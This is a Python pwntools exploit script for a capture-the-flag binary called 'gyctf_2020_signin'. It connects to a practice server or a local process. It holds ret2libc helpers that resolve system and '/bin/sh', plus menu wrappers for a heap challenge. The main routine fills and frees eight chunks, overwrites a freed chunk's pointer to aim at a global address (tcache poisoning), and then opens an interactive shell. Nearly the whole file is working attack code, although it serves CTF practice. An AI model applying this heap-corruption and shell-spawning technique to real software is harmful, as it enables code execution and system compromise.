from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './gyctf_2020_signin'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',28320) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,3,2,4
def add(index):
	sla('?',str(_add))
	sla('?',str(index))

def free(index):
	sla('?',str(_free))
	sla('?',str(index))

def edit(index,content):
	sla('?',str(_edit))
	sla('?',str(index))
	s(content)

def show(index):
	sla(':',str(_show))
	sla(':',str(index))

# start
for i in range(8):
	add(i)
for i in range(8):
	free(i)

dbg()
edit(7,p64(0x4040c0-0x10))
add(8)
dbg()
sla('?','6')
dbg()
# end

itr()
